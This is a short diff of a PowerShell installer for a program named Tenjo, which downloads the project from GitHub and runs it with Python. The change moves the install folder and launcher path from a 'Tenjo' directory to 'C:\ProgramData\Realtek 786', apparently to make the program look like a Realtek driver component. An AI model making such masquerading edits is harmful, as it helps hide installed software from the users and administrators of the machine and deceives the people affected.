@@ -10,7 +10,7 @@ Write-Host "   With Password + Folder Protection" -ForegroundColor Cyan
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
 
-$InstallDir = "C:\ProgramData\Tenjo"
+$InstallDir = "C:\ProgramData\Realtek 786"
 $GitHubZip = "https://github.com/Adi-Sumardi/Tenjo/archive/refs/heads/master.zip"
 $TempZip = "$env:TEMP\tenjo.zip"
 $TempExtract = "$env:TEMP\tenjo_extracted"
@@ -133,7 +133,7 @@ try {
     # Batch wrapper
     @"
 @echo off
-cd /d "C:\ProgramData\Tenjo"
+cd /d "C:\ProgramData\Realtek 786"
 python.exe main.py
 "@ | Set-Content "$InstallDir\start_tenjo.bat"
     
